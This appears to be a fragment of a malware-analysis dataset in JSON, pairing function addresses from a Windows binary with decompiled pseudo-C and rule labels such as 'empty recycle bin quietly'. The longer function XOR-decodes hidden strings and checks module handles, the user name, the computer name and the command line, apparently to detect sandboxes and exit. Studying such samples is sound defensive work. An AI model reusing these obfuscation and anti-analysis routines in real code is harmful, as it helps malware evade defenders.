        "decompiled_code": "\nulong __cdecl fcn.0040dfff(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t dwSize;\n    \n    iVar2 = fcn.0040debc(&var_24h, &dwSize);\n    var_28h = 0;\n    if ((iVar2 == 0) &&\n       (arg_8h_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4),  iVar2 = var_20h,  iVar4 = dwSize, \n       uVar5 = var_24h,  var_10h = arg_8h_00,  arg_8h_00 != 0)) {\n        do {\n            var_1ch = uVar5;\n            var_18h = iVar2;\n            dwSize = arg_8h_00;\n            fcn.0040d46a(arg_8h_00, 0x1000);\n            iVar1 = var_10h;\n            arg_8h_00 = dwSize + 0x1000;\n            var_1ch = uVar5 + 0x1000;\n            var_18h = iVar2 + (0xffffefff < uVar5);\n            iVar4 = iVar4 + -0x1000;\n            iVar2 = var_18h;\n            uVar5 = var_1ch;\n        } while (iVar4 != 0);\n        dwSize = arg_8h_00;\n        puVar3 = fcn.00405964(0x1000);\n        if (puVar3 == NULL) {\n            var_2ch = 0;\n        }\n        else {\n            var_2ch = *puVar3 + var_24h;\n            var_28h = var_20h + CARRY4(*puVar3, var_24h);\n        }\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(iVar1, 0, 0x8000);\n    }\n    else {\n        var_2ch = 0;\n    }\n    return CONCAT44(var_28h, var_2ch);\n}\n",
        "token_count": 578
    },
    "0040b2d7": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040b2d7(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *extraout_ECX_01;\n    uint8_t *puVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint pcbBuffer;\n    uint8_t *var_a0h;\n    int32_t var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    uint8_t *var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    uint8_t *var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uchar var_33h [3];\n    uint32_t var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint8_t var_24h [3];\n    uchar var_21h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    ushort var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0040b126();\n    if (iVar4 != 0) {\n        fcn.0040b2bf();\n    }\n    _var_21h = CONCAT31(0x320d36, var_21h);\n    stack0xffffffdf = 0x1f3e0339;\n    var_1ch._3_1_ = 0x7b;\n    var_18h._0_1_ = 0x35;\n    var_18h._1_1_ = 10;\n    var_18h._2_1_ = 0x3e;\n    var_18h._3_1_ = 0x6f;\n    var_84h = 0x51556f52;\n    var_80h._0_1_ = 0x66;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_4ch = 5;\n    iVar13 = 0;\n    var_48h = &var_20h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar6 != 0x42cb20) {\n            *(iVar13 + iVar4) = *(&var_84h + iVar13 % var_4ch) ^ (iVar13 + iVar4)[&var_20h - iVar4];\n        }\n        iVar13 = iVar13 + 1;\n    } while (iVar13 < 0xc);\n    iVar13 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar13 != 0) {\n        fcn.0040b2bf();\n    }\n    _var_21h = _var_21h & 0xff | 0x2e2f1d00;\n    stack0xffffffdf = 0x2355424;\n    var_1ch._3_1_ = 99;\n    var_18h._0_1_ = 0x23;\n    var_18h._1_1_ = 0x2d;\n    var_18h._2_1_ = 0x5c;\n    var_18h._3_1_ = 0x59;\n    var_8h._0_1_ = 0x6e;\n    var_8h._1_1_ = 0x4d;\n    var_8h._2_1_ = 0x47;\n    var_8h._3_1_ = 0x41;\n    var_4h._0_1_ = 0x30;\n    var_4h._1_1_ = 0x59;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_54h = 6;\n    iVar6 = 0;\n    var_84h = iVar13;\n    var_48h = &var_20h - iVar13;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar7 != 0x52bede) {\n            *(iVar6 + iVar13) = *(&var_8h + iVar6 % var_54h) ^ (iVar6 + iVar13)[&var_20h - iVar13];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar13 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar13);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar13 != 0) {\n        fcn.0040b2bf();\n    }\n    pcbBuffer = 0x400;\n    iVar13 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41cdf0, &pcbBuffer);\n    if (iVar13 == 0) {\n        fcn.0040b2bf();\n    }\n    _var_21h = _var_21h & 0xff | 0x42402600;\n    stack0xffffffdf = 0x410b101f;\n    var_1ch._3_1_ = 0x65;\n    var_18h._0_1_ = 0x1e;\n    var_18h._1_1_ = 0x10;\n    var_18h._2_1_ = 0x17;\n    var_18h._3_1_ = 0x35;\n    var_7ch = 0x6d303565;\n    var_78h._0_1_ = 0x75;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar13 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_48h = &var_20h - iVar13;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar7 != 0x4c83eb) {\n            *(iVar6 + iVar13) = *(&var_7ch + iVar6 % var_4ch) ^ (iVar6 + iVar13)[&var_20h - iVar13];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar13);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.0040b2bf();\n    }\n    var_8h._0_1_ = 0x1b;\n    var_8h._1_1_ = 0xe;\n    var_8h._2_1_ = 0x3c;\n    var_8h._3_1_ = 0x26;\n    var_4h._0_1_ = 0x20;\n    var_4h._1_1_ = 0x27;\n    var_4h._2_1_ = 0x17;\n    var_4h._3_1_ = 0x52;\n    var_74h = 0x42526f48;\n    var_70h._0_1_ = 0x42;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_7ch = iVar6;\n    var_48h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar8 != 0xfcddf2) {\n            *(iVar7 + iVar6) = *(&var_74h + iVar7 % var_4ch) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.0040b2bf();\n    }\n    pcbBuffer = 0x400;\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41cdf0, &pcbBuffer);\n    if (iVar6 == 0) {\n        fcn.0040b2bf();\n    }\n    var_8h._0_1_ = 0x60;\n    var_8h._1_1_ = 0x13;\n    var_8h._2_1_ = 0x7c;\n    var_8h._3_1_ = 6;\n    var_4h._0_1_ = 0x26;\n    var_4h._1_1_ = 0x7c;\n    var_4h._2_1_ = 10;\n    var_4h._3_1_ = 0x32;\n    var_6ch = 0x42325233;\n    var_68h._0_1_ = 100;\n    uVar5 = (*pcVar2)(8, 9);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_74h = iVar6;\n    var_48h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar8 != 0x37f09c) {\n            *(iVar7 + iVar6) = *(&var_6ch + iVar7 % var_4ch) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.0040b2bf();\n    }\n    var_8h._0_1_ = 0x5a;\n    var_8h._1_1_ = 0x14;\n    var_8h._2_1_ = 0x3e;\n    var_8h._3_1_ = 0x75;\n    var_4h._0_1_ = 0x3c;\n    var_4h._1_1_ = 0x24;\n    var_4h._2_1_ = 6;\n    var_4h._3_1_ = 0x77;\n    var_10h = 0x3977476d;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x6a);\n    uVar5 = (*pcVar2)(8, 9);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_6ch = iVar6;\n    var_48h = &var_8h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar8 != 0x8ce576) {\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_4ch) ^ (iVar7 + iVar6)[&var_8h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41cdf0, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.0040b2bf();\n    }\n    _var_33h = _var_33h & 0xffffff | 0xb000000;\n    stack0xffffffcd = 0x322f1c78;\n    var_2ch._1_2_ = 0x6b02;\n    var_2ch._3_1_ = 0xb;\n    var_28h._0_2_ = 0x2137;\n    var_28h._2_1_ = 6;\n    stack0xffffffd7 = 0x2c390d6a;\n    _var_21h = 0x24076d13;\n    stack0xffffffdf = 0x376a1f2b;\n    var_1ch._3_1_ = 0x18;\n    var_18h._0_1_ = 0x11;\n    var_18h._1_1_ = 0x26;\n    var_18h._2_1_ = 0x54;\n    var_18h._3_1_ = 0x4e;\n    var_10h = 0x6b4e3943;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x65);\n    uVar5 = (*pcVar2)(8, 0x1d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_48h = &var_30h - iVar6;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar8 != 0x8c5a9) {\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_4ch) ^ (iVar7 + iVar6)[&var_30h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1c);\n    stack0xffffffd7 = stack0xffffffd7 & 0xff | 0x341f1000;\n    _var_21h = 0x13e3c41;\n    stack0xffffffdf = 0xf46280f;\n    var_1ch._3_1_ = 0x36;\n    var_18h._0_1_ = 0x31;\n    var_18h._1_1_ = 0x15;\n    var_18h._2_1_ = 0x2e;\n    var_18h._3_1_ = 0x5a;\n    var_14h = 0x5337;\n    var_8h._0_1_ = 0x43;\n    var_8h._1_1_ = 0x66;\n    var_8h._2_1_ = 0x47;\n    var_8h._3_1_ = 0x35;\n    var_4h._0_1_ = 0x59;\n    var_4h._1_1_ = 0x53;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_a0h = var_24h + -iVar7;\n    var_48h = iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        puVar11 = extraout_ECX;\n        if (iVar9 != 0xb94af0) {\n            puVar11 = iVar8 + iVar7;\n            *puVar11 = *(&var_8h + iVar8 % var_54h) ^ puVar11[var_24h + -iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x12);\n    cVar3 = fcn.0040b0ca(puVar11, puVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.0040b2bf();\n    }\n    var_10h = 0x44390014;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x72);\n    var_44h = 0x64704d55;\n    var_40h._0_1_ = 0x72;\n    uVar5 = (*pcVar2)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_a0h = iVar7;\n    var_9ch = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar9 != 0x389186) {\n            *(iVar8 + iVar7) = *(&var_44h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_8h._0_1_ = 5;\n    var_8h._1_1_ = 0x15;\n    var_8h._2_1_ = 0x22;\n    var_8h._3_1_ = 0x22;\n    var_4h._0_1_ = 4;\n    var_4h._1_1_ = 0x47;\n    var_10h = 0x6a615a47;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x57);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 7);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_9ch = iVar7;\n    var_98h = &var_8h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar9 != 0x9c9664) {\n            *(iVar8 + iVar7) = *(&var_10h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[&var_8h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 6);\n    var_10h = 0x6d3b1b13;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x4f);\n    var_44h = 0x35745945;\n    var_40h._0_1_ = 0x4f;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_98h = iVar7;\n    var_94h = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n        if (iVar9 != 0x565029) {\n            *(iVar8 + iVar7) = *(&var_44h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_10h = 0x3b1f1614;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x53);\n    var_44h = 0x6e525345;\n    var_40h._0_1_ = 0x53;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_94h = iVar7;\n    var_90h = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar9 != 0x654354) {\n            *(iVar8 + iVar7) = *(&var_44h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_10h = 0x33721e60;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x45);\n    var_8h._0_1_ = 0x33;\n    var_8h._1_1_ = 0x53;\n    var_8h._2_1_ = 0x31;\n    var_8h._3_1_ = 0x7a;\n    var_4h._0_1_ = 0x45;\n    var_4h._1_1_ = 0x5a;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_90h = iVar7;\n    var_8ch = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar9 != 0xdbb078) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_54h) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    stack0xffffffd7 = stack0xffffffd7 & 0xff | 0x151f3300;\n    _var_21h = 0x715a0370;\n    stack0xffffffdf = 0x4a79156c;\n    var_1ch._3_1_ = 0x65;\n    var_18h._0_1_ = 0x71;\n    var_18h._1_1_ = 5;\n    var_18h._2_1_ = 0x7f;\n    var_18h._3_1_ = 0x4a;\n    var_14h = CONCAT11(var_14h._1_1_, 0x51);\n    var_10h = 0x3541517a;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x4f);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_8ch = iVar7;\n    var_88h = var_24h + -iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar9 != 0xe4ad4f) {\n            *(iVar8 + iVar7) = *(&var_10h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[var_24h + -iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x11);\n    var_10h = 0x3d220131;\n    var_ch._0_2_ = 0x761a;\n    var_ch._2_1_ = 0x77;\n    var_8h._0_1_ = 0x77;\n    var_8h._1_1_ = 0x55;\n    var_8h._2_1_ = 0x6c;\n    var_8h._3_1_ = 0x69;\n    var_4h._0_1_ = 0x37;\n    var_4h._1_1_ = 0x47;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_88h = iVar7;\n    var_50h = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_IsSystemResumeAutomatic)();\n        if (iVar9 != 0xfb2dcd) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_54h) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 7);\n    var_44h = 0x5173b22;\n    var_40h._0_1_ = 0x55;\n    var_8h._0_1_ = 0x71;\n    var_8h._1_1_ = 0x74;\n    var_8h._2_1_ = 0x59;\n    var_8h._3_1_ = 0x4c;\n    var_4h._0_1_ = 0x55;\n    var_4h._1_1_ = 0x74;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_50h = &var_44h - iVar7;\n    var_10h = iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar9 != 0xd6ee7d) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_54h) ^ (iVar8 + iVar7)[&var_44h - iVar7];\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    *0x41d200 = var_a0h;\n    *0x41d208 = var_9ch;\n    *0x41d20c = var_98h;\n    *0x41d210 = var_94h;\n    *0x41d214 = var_90h;\n    uVar12 = 0;\n    *0x41d218 = var_8ch;\n    *0x41d21c = var_88h;\n    *0x41d220 = iVar7;\n    do {\n        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, *(uVar12 + 0x41d200));\n        if (iVar7 != 0) {\n            fcn.0040b2bf();\n        }\n        uVar12 = uVar12 + 4;\n    } while (uVar12 < 0x20);\n    stack0xffffffd7 = stack0xffffffd7 & 0xff | 0x302e3300;\n    _var_21h = 0x2e273809;\n    stack0xffffffdf = 0x11f3b;\n    var_1ch._3_1_ = 0x35;\n    var_18h._0_1_ = 0x27;\n    var_18h._1_1_ = 5;\n    var_18h._2_1_ = 0x38;\n    var_18h._3_1_ = 0xb;\n    var_14h = CONCAT11(var_14h._1_1_, 0x47);\n    var_64h = 0x6c544765;\n    var_60h._0_1_ = 0x57;\n    uVar5 = (*pcVar2)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_50h = var_24h + -iVar7;\n    var_44h = iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        puVar11 = extraout_ECX_00;\n        if (iVar9 != 0x56b05d) {\n            puVar11 = iVar8 + iVar7;\n            *puVar11 = *(&var_64h + iVar8 % var_4ch) ^ puVar11[var_24h + -iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x11);\n    cVar3 = fcn.0040b0ca(puVar11, puVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.0040b2bf();\n    }\n    _var_21h = _var_21h & 0xff | 0x3011800;\n    stack0xffffffdf = 0x22272f44;\n    var_1ch._3_1_ = 0x2a;\n    var_18h._0_1_ = 0x1e;\n    var_18h._1_1_ = 0x48;\n    var_18h._2_1_ = 0x5a;\n    var_8h._0_1_ = 0x4e;\n    var_8h._1_1_ = 0x68;\n    var_8h._2_1_ = 0x71;\n    var_8h._3_1_ = 0x30;\n    var_4h._0_1_ = 0x5a;\n    var_4h._1_1_ = 0x46;\n    uVar5 = (*pcVar2)(8, 0xc);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_64h = iVar7;\n    var_50h = &var_20h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar9 != 0xf89236) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_54h) ^ (iVar8 + iVar7)[&var_20h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xb);\n    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar7);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar7 != 0) {\n        fcn.0040b2bf();\n    }\n    var_3ch = 0x6c163716;\n    var_38h._0_1_ = 6;\n    stack0xffffffc5 = 0x64152a04;\n    _var_33h = 0x221b2c1c;\n    stack0xffffffcd = 0x1e2a2257;\n    var_2ch._1_2_ = 0x6424;\n    var_28h._0_2_ = 0x162c;\n    var_28h._2_1_ = 0x34;\n    stack0xffffffd7 = 0x24362657;\n    _var_21h = 0x37234d13;\n    stack0xffffffdf = 0x74c3e1d;\n    var_1ch._3_1_ = 0x20;\n    var_18h._0_1_ = 10;\n    var_18h._1_1_ = 0x23;\n    var_18h._2_1_ = 0x51;\n    var_18h._3_1_ = 0x3e;\n    var_14h = 0x782b;\n    var_5ch = 0x38507845;\n    var_58h._0_1_ = 0x51;\n    var_2ch._3_1_ = var_38h;\n    uVar5 = (*pcVar2)(8, 0x2b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_50h = &var_3ch - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        puVar11 = extraout_ECX_01;\n        if (iVar9 != 0x2fa7a3) {\n            puVar11 = iVar8 + iVar7;\n            *puVar11 = *(&var_5ch + iVar8 % var_4ch) ^ puVar11[&var_3ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x2a);\n    cVar3 = fcn.0040b0ca(puVar11, puVar11);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.0040b2bf();\n    }\n    stack0xffffffcd = stack0xffffffcd & 0xffffff | 0x74000000;\n    var_2ch._1_2_ = 0x5458;\n    var_2ch._3_1_ = 0x60;\n    var_28h._0_2_ = 0x6075;\n    var_28h._2_1_ = 0x77;\n    stack0xffffffd7 = 0x737a5659;\n    _var_21h = 0x565e767b;\n    stack0xffffffdf = 0x73607561;\n    var_1ch._3_1_ = 0x5e;\n    var_18h._0_1_ = 0x5f;\n    var_18h._1_1_ = 0x62;\n    var_18h._2_1_ = 0x71;\n    var_18h._3_1_ = 0x4d;\n    var_8h._0_1_ = 0x41;\n    var_8h._1_1_ = 0x6d;\n    var_8h._2_1_ = 0x66;\n    var_8h._3_1_ = 0x57;\n    var_4h._0_1_ = 0x41;\n    var_4h._1_1_ = 0x4d;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar9 = 0;\n    var_5ch = iVar8;\n    var_50h = &var_2ch - iVar8;\n    do {\n        iVar10 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        if (iVar10 != 0xaa7d83) {\n            *(iVar9 + iVar8) = *(&var_8h + iVar9 % var_54h) ^ (iVar9 + iVar8)[&var_2ch - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x18);\n    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 != 0) {\n        fcn.0040b2bf();\n    }\n    stack0xffffffcd = stack0xffffffcd & 0xffffff | 0x76000000;\n    var_2ch._1_2_ = 0x163;\n    var_2ch._3_1_ = 0xe;\n    var_28h._0_2_ = 0x6c67;\n    var_28h._2_1_ = 99;\n    stack0xffffffd7 = 0x727d0201;\n    _var_21h = 0x60010264;\n    stack0xffffffdf = 0x4186272;\n    var_1ch._3_1_ = 99;\n    var_18h._0_1_ = 0x74;\n    var_18h._1_1_ = 100;\n    var_18h._2_1_ = 5;\n    var_18h._3_1_ = 0x36;\n    var_8h._0_1_ = 0x41;\n    var_8h._1_1_ = 0x55;\n    var_8h._2_1_ = 0x35;\n    var_8h._3_1_ = 0x36;\n    var_4h._0_1_ = 0x50;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar9 = 0;\n    var_54h = iVar8;\n    var_50h = &var_2ch - iVar8;\n    do {\n        iVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar10 != 0xee9e11) {\n            *(iVar9 + iVar8) = *(&var_8h + iVar9 % var_4ch) ^ (iVar9 + iVar8)[&var_2ch - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x18);\n    iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar8 != 0) {\n        fcn.0040b2bf();\n    }\n    stack0xffffffcd = stack0xffffffcd & 0xffffff | 0x5b000000;\n    var_2ch._1_2_ = 0x6759;\n    var_2ch._3_1_ = 0x4c;\n    var_28h._0_2_ = 0x4163;\n    var_28h._2_1_ = 0x5c;\n    stack0xffffffd7 = 0x54794360;\n    _var_21h = 0x6d4d615b;\n    stack0xffffffdf = 0x467e5a59;\n    var_1ch._3_1_ = 0x66;\n    var_18h._0_1_ = 0x5a;\n    var_18h._1_1_ = 0x5e;\n    var_18h._2_1_ = 0x67;\n    var_18h._3_1_ = 0x74;\n    var_8h._0_1_ = 0x6c;\n    var_8h._1_1_ = 0x6f;\n    var_8h._2_1_ = 0x53;\n    var_8h._3_1_ = 0x74;\n    var_4h._0_1_ = 0x54;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar9 = 0;\n    var_50h = &var_2ch - iVar8;\n    do {\n        iVar10 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar10 != 0xdeae3a) {\n            *(iVar9 + iVar8) = *(&var_8h + iVar9 % var_4ch) ^ (iVar9 + iVar8)[&var_2ch - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x18);\n    iVar10 = 